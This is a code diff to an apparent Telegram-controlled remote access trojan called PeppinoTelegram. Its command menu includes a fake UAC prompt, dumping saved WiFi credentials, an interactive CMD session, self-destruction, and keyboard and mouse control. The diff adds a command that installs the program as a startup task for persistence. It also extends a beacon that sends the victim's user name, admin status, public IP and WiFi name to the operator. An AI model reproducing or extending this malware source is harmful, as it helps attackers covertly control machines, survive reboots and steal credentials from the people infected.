@@ -515,7 +515,6 @@ class PeppinoTelegram:
             Command("fakeuac", self.fakeuac, "Show fake UAC prompt.", "system", "🛡️ Fake UAC"),
             Command("selfdestruction", self.selfdestruction, "Remove program permanently.", "system", "💣 Selfdestruction"),
             Command("clear", self.clear, "Clean windows, webcam, temp files.", "system", "🧹 Clear"),
-            Command("altf4", self.altf4, "Send Alt+F4.", "system", "⌨️ Altf4"),
 
             # 🌐 Network & Remote Access
             Command("wifiinfo", self.wifiinfo, "Show saved WiFi credentials.", "network", "📶 Wifiinfo"),
@@ -604,6 +603,7 @@ class PeppinoTelegram:
             Command("procmonrem", self.processmonitorrem, "Remove process from monitor.", "system_control", "➖ Procmon Remove"),
             Command("procmonmenu", self.processmonitormenushow, "Show process monitor menu.", "system_control", "📊 Procmon Menu"),
             Command("cmdsession", self.cmdsession, "Open interactive CMD session.", "system_control", "</> CMDSession"),
+            Command("add_as_task", self.add_as_task, "Adds itself as a task", "system_control", "⏰ Set as startup task"),
 
             # 🎮 Input / Device Control
             Command("randomkeyboard", self.randomkeyboard, "Send random keyboard input.", "input", "🎹 Randomkeyboard"),
@@ -613,6 +613,7 @@ class PeppinoTelegram:
             Command("set_mouse_jump", self.setMouseJump, "Set mouse jump distance.", "input", "🎯 Set Mouse Jump"),
             Command("leftclick", self.leftclick, "Left mouse click.", "input", "🖱️ Left Click"),
             Command("rightclick", self.rightclick, "Right mouse click.", "input", "🖱️ Right Click"),
+            Command("altf4", self.altf4, "Send Alt+F4.", "input", "⌨️ Altf4"),
 
             # 📋 Messaging
             Command("bsend", self.bsend, "Send text message.", "messaging", "📤 Bsend"),
@@ -703,6 +704,18 @@ class PeppinoTelegram:
         press_key('f4')
         release_key('f4')
         release_key('alt')
+
+    def add_as_task(self, task_name):
+        if create_startup_task(task_name, FROZEN):
+            self.bsendWithHtml(
+                "⏰ <b>Startup Task Created</b>\n"
+                f"<code>{task_name}</code> will run at system boot."
+            )
+        else:
+            self.bsendWithHtml(
+                "❌ <b>Task Creation Failed</b>\n"
+                "Likely cause: insufficient privileges."
+            )
 
     def ask_yesno(self, custom_message: str = "Confirm action") -> bool:
         prompt = (
@@ -1879,7 +1892,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
                     for arg in function_needed_args:
                         if arg == "self":
                             continue
-                        response = self.send_prompt(f"Choose a {arg} for {command}")
+                        response = self.send_prompt(f"Choose a <code>{arg}</code> for <code>{command}</code>")
                         if response is None:
 
                             self.operation_canceled(info="Action timed out.")
@@ -2849,6 +2862,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
             f"🕒 <b>Started:</b> <code>{html.escape(now())}</code>\n"
             f"👤 <b>User:</b> <code>{html.escape(getlogin())}</code>\n"
             f"🛡️ <b>Admin:</b> <code>{'YES ✅' if self.has_admin else 'NO ❌'}</code>\n"
+            f"🧊 <b>Frozen:</b> <code>{'YES ✅' if FROZEN else 'NO ❌'}</code>\n"
             f"🌐 <b>Public IP:</b> <code>{html.escape(public_ip)}</code>\n"
             f"📡 <b>WiFi:</b> <code>{html.escape(get_wifi_name())}</code>\n"
             f"📸 <b>Webcam:</b> <code>{html.escape(check_webcam())}</code>\n"
